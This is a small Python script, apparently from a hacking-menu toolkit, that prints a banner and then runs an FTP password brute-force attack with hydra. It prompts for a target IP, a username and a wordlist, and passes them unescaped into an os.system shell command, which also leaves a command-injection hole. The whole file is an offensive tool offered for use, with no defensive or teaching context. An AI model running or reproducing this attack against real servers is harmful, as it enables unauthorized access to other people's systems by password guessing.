# CREATED BY: RAMIZ UDDIN
import os, time

def tool_header(name):
    os.system("clear")
    print("\033[1;36m" + "="*45)
    print(f"      {name.upper()}")
    print("      CREATED BY: RAMIZ UDDIN")
    print("="*45 + "\033[0m")

# CREATED BY: RAMIZ UDDIN
import os, cyber_deps
cyber_deps.ensure_deps(system_pkgs=["hydra"])
def run():
    print("\033[1;32m[*] ", end=""); print("\n[*] FTP Brute Force")
    t = input("Target IP: ")
    if t=="99": import cyber_deps; cyber_deps.remove_deps(); return
    u = input("User: ")
    w = input("Wordlist: ") or "pass.txt"
    os.system(f"hydra -l {u} -P {w} {t} ftp")
    input("[Enter]")
if __name__=="__main__": run()